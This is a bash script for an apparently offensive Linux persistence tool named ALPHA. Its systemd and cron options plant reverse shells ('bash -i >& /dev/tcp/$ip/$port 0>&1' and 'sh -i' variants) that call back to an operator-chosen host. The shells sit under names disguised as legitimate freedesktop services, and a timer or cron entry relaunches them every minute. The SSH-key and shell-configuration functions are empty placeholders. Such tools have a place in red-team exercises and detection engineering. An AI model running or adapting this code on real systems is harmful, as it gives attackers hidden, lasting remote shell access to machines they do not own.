#!/bin/bash
RED='\033[0;31m'
NC='\033[0m'

print_banner() {
    echo ""
    echo " ▄▄▄       ██▓     ██▓███   ██░ ██  ▄▄▄       "
    echo "▒████▄    ▓██▒    ▓██░  ██▒▓██░ ██▒▒████▄     "
    echo "▒██  ▀█▄  ▒██░    ▓██░ ██▓▒▒██▀▀██░▒██  ▀█▄   "
    echo "░██▄▄▄▄██ ▒██░    ▒██▄█▓▒ ▒░▓█ ░██ ░██▄▄▄▄██  "
    echo " ▓█   ▓██▒░██████▒▒██▒ ░  ░░▓█▒░██▓ ▓█   ▓██▒ "
    echo " ▒▒   ▓▒█░░ ▒░▓  ░▒▓▒░ ░  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░ "
    echo "  ▒   ▒▒ ░░ ░ ▒  ░░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░ "
    echo "  ░   ▒     ░ ░   ░░        ░  ░░ ░  ░   ▒    "
    echo "      ░  ░    ░  ░          ░  ░  ░      ░  ░ "
    echo "                                 "
    echo "Aegrah's Linux Persistence Honed Assistant (ALPHA)"
    echo "Github: https://github.com/Aegrah/ALPHA"
    echo "Twitter: https://twitter.com/RFGroenewoud"
    echo ""
}

# Function to check if the user is root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        return 1
    else
        return 0
    fi
}

# Function to show the usage menu for regular users
usage_user() {
    echo ""
    echo -e "${RED}[!] Warning: More features are available when running as root.${NC}"
    echo ""
    echo "Low Privileged User Options:"
    echo ""
    echo "  --cron                      Cron job persistence"
    echo "    --default                    Use default cron settings"
    echo "        --ip <ip>                  Specify IP address"
    echo "        --port <port>              Specify port number"
    echo "  --shell-configuration       Shell configuration persistence"
    echo "  --ssh-key                   SSH key persistence"
    echo "  --systemd                   Systemd service persistence"
    echo "      --default                    Use default systemd settings"
    echo "          --ip <ip>                  Specify IP address"
    echo "          --port <port>              Specify port number"
    echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
    echo "          --path <path>                Specify custom service path (must end with .service)"
    echo "          --command <command>          Specify custom persistence command (no validation)"
    echo "          --timer                      Create systemd timer (1 minute interval)"
}

# Function to show the usage menu for root users
usage_root() {
    echo "Root User Options:"
    echo ""
    echo "  --cron                      Cron job persistence"
    echo "      --default                    Use default cron settings"
    echo "          --ip <ip>                  Specify IP address"
    echo "          --port <port>              Specify port number"
    echo "      --custom                     Use custom cron settings"
    echo "          --command <command>         Specify custom persistence command (no validation)"
    echo "          --crond                     Persist in cron.d directory"
    echo "          --daily                     Persist in cron.daily directory"
    echo "          --hourly                    Persist in cron.hourly directory"
    echo "          --monthly                   Persist in cron.monthly directory"
    echo "          --weekly                    Persist in cron.weekly directory"
    echo "          --name <name>               Specify custom cron job name"
    echo "          --crontab                   Persist in crontab file"

    echo "  --shell-configuration       Shell configuration persistence"
    echo "  --ssh-key                   SSH key persistence"
    echo "  --systemd                   Systemd service persistence"
    echo "      --default                    Use default systemd settings"
    echo "          --ip <ip>                  Specify IP address"
    echo "          --port <port>              Specify port number"
    echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
    echo "          --path <path>                Specify custom service path (must end with .service)"
    echo "          --command <command>          Specify custom persistence command (no validation)"
    echo "          --timer                      Create systemd timer (1 minute interval)"
}

# Function for systemd setup
setup_systemd() {
    local service_path=""
    local timer_path=""
    local timer=0
    local command=""
    local custom=0
    local default=0
    local ip=""
    local port=""

    while [[ "$1" != "" ]]; do
        case $1 in
            --default )
                default=1
                ;;
            --custom )
                custom=1
                ;;
            --path )
                shift
                service_path=$1
                if [[ ! $service_path == *.service ]]; then
                    echo "Error: --path must end with .service"
                    exit 1
                fi
                ;;
            --command )
                shift
                command=$1
                ;;
            --timer )
                timer=1
                ;;
            --ip )
                shift
                ip=$1
                ;;
            --port )
                shift
                port=$1
                ;;
            * )
                echo "Invalid option for --systemd: $1"
                exit 1
        esac
        shift
    done

    if [[ $default -eq 1 && $custom -eq 1 ]]; then
        echo "Error: --default and --custom cannot be specified together."
        exit 1
    elif [[ $default -eq 1 ]]; then
        if [[ -z $ip || -z $port ]]; then
            echo "Error: --ip and --port must be specified when using --default."
            exit 1
        fi

	    if check_root; then
            service_path="/usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service"
            timer_path="/usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer"
        else
            local current_user=$(whoami)
            service_path="/home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service"
            timer_path="/home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer"
        fi

        mkdir -p $(dirname "$service_path")
        cat <<-EOF > $service_path
		[Unit]
		Description=Network Name Resolution

		[Service]
		ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
		Restart=always
		RestartSec=60

		[Install]
		WantedBy=default.target
		EOF

        if check_root; then
		if [ -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service ]; then
			echo "Service file created successfully!"
		else
			echo "Failed to create service file!"
			exit 1
		fi

        else
            if [ -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service ]; then
                echo "Service file created successfully!"
            else
                echo "Failed to create service file!"
                exit 1
            fi
        fi

        cat <<-EOF > $timer_path
		[Unit]
		Description=Network Name Resolution Timer

		[Timer]
		OnCalendar=*:*:00
		Persistent=true

		[Install]
		WantedBy=timers.target
		EOF

                if check_root; then
            if [ -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer ]; then
                echo "Timer file created successfully!"
            else
                echo "Failed to create timer file!"
                exit 1
            fi

        else
            if [ -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer ]; then
                echo "Timer file created successfully!"
            else
                echo "Failed to create timer file!"
                exit 1
            fi
        fi

        if check_root; then
            systemctl daemon-reload
            systemctl enable $(basename $timer_path)
            systemctl start $(basename $timer_path)
        else
            systemctl --user daemon-reload
            systemctl --user enable $(basename $timer_path)
            systemctl --user start $(basename $timer_path)
        fi

    elif [[ $custom -eq 1 ]]; then
        if [[ -z $service_path || -z $command ]]; then
            echo "Error: --path and --command must be specified when using --custom."
            exit 1
        fi

        mkdir -p $(dirname "$service_path")
        cat <<-EOF > $service_path
		[Unit]
		Description=Custom Service

		[Service]
		ExecStart=$command
		Restart=always
		RestartSec=60

		[Install]
		WantedBy=default.target
		EOF

        if [ -f $service_path ]; then
            echo "Service file created successfully!"
        else
            echo "Failed to create service file!"
            exit 1
        fi

		if check_root; then
			systemctl daemon-reload
			systemctl enable $(basename $service_path)
			systemctl start $(basename $service_path)
		else
			systemctl --user daemon-reload
			systemctl --user enable $(basename $service_path)
			systemctl --user start $(basename $service_path)
		fi

        if [[ $timer -eq 1 ]]; then
            timer_path="${service_path%.service}.timer"
            mkdir -p $(dirname "$timer_path")
            cat <<-EOF > $timer_path
			[Unit]
			Description=Custom Timer

			[Timer]
			OnCalendar=*:*:00
			Persistent=true

			[Install]
			WantedBy=timers.target
			EOF

            if [ -f $timer_path ]; then
                echo "Timer file created successfully!"
            else
                echo "Failed to create timer file!"
                exit 1
            fi

			if check_root; then
				systemctl daemon-reload
				systemctl enable $(basename $timer_path)
				systemctl start $(basename $timer_path)
			else
				systemctl --user daemon-reload
				systemctl --user enable $(basename $timer_path)
				systemctl --user start $(basename $timer_path)
			fi
        fi
    else
        echo "Error: Either --default or --custom must be specified for --systemd."
        exit 1
    fi

    echo "[+] Persistence established."
}

# Function for cron job setup
setup_cron() {
    local cron_path=""
    local command=""
    local custom=0
    local default=0
    local ip=""
    local port=""
    local name=""
    local option=""

    while [[ "$1" != "" ]]; do
        case $1 in
            --default )
                default=1
                ;;
            --custom )
                custom=1
                ;;
            --command )
                shift
                command=$1
                ;;
            --ip )
                shift
                ip=$1
                ;;
            --port )
                shift
                port=$1
                ;;
            --crond|--daily|--hourly|--monthly|--weekly )
                if check_root; then
                    option=$1
                    case $option in
                        --crond )
                            cron_path="/etc/cron.d"
                            ;;
                        --daily )
                            cron_path="/etc/cron.daily"
                            ;;
                        --hourly )
                            cron_path="/etc/cron.hourly"
                            ;;
                        --monthly )
                            cron_path="/etc/cron.monthly"
                            ;;
                        --weekly )
                            cron_path="/etc/cron.weekly"
                            ;;
                    esac
                else
                    echo "Error: Only root users can use the $option option."
                    exit 1
                fi
                ;;
            --crontab )
                if check_root; then
                    cron_path="/etc/crontab"
                else
                    echo "Error: Only root users can use the --crontab option."
                    exit 1
                fi
                ;;
            --name )
                shift
                name=$1
                ;;
            * )
                echo "Invalid option: $1"
                exit 1
        esac
        shift
    done

    if [[ $default -eq 1 ]]; then
        if [[ -z $ip || -z $port ]]; then
            echo "Error: --default requires --ip and --port."
            exit 1
        fi
        if check_root; then
            cron_path="/etc/cron.d/freedesktop_timesync1"
            command="* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'"
            echo "$command" > "$cron_path"

        else
            command="* * * * * /bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'"
            (crontab -l 2>/dev/null; echo "$command") | crontab -
        fi
    elif [[ $custom -eq 1 ]]; then
        if [[ -z $command ]]; then
            echo "Error: --custom requires --command."
            exit 1
        fi
        if [[ $cron_path != "/etc/crontab" && -z $name ]]; then
            echo "Error: --custom requires --name for all options other than --crontab."
            exit 1
        fi
        if [[ $cron_path != "/etc/crontab" ]]; then
            cron_path="$cron_path/$name"
        fi
        echo "$command" > "$cron_path"
    else
        echo "Error: Either --default or --custom must be specified for --cron."
        exit 1
    fi

    echo "[+] Cron job persistence established."
}

# Function for generating SSH key
generate_ssh_key() {
    echo "Generating SSH key..."
    # Add your SSH key generation code here
}

# Function for shell configuration
configure_shell() {
    echo "Configuring shell..."
    # Add your shell configuration code here
}

# Main script logic
QUIET=0

if [[ $# -eq 0 ]]; then
    if [[ $QUIET -ne 1 ]]; then
        print_banner
    fi
    if check_root; then
        usage_root
    else
        usage_user
    fi
    exit 0
fi

for arg in "$@"; do
    if [[ "$arg" == "-h" || "$arg" == "--help" ]]; then
        if [[ $QUIET -ne 1 ]]; then
            print_banner
        fi
        if check_root; then
            usage_root
        else
            usage_user
        fi
        exit 0
    fi
done

# Parse command line arguments
while [[ "$1" != "" ]]; do
    case $1 in
        -q | --quiet )
            QUIET=1
            ;;
        -h | --help )
            if check_root; then
                usage_root
            else
                usage_user
            fi
            exit
            ;;
        --systemd )
            shift
            setup_systemd "$@"
            exit
            ;;
        --cron )
            shift
            setup_cron "$@"
            exit
            ;;
        --ssh-key )
            generate_ssh_key
            exit
            ;;
        --shell-configuration )
            configure_shell
            exit
            ;;
        * )
            echo "Invalid option: $1"
            if check_root; then
                usage_root
            else
                usage_user
            fi
            exit 1
    esac
    shift
done

# Print banner unless in quiet mode
if [[ $QUIET -ne 1 ]]; then
    print_banner
fi

# Show the usage menu if no specific command is given
if check_root; then
    usage_root
else
    usage_user
fi
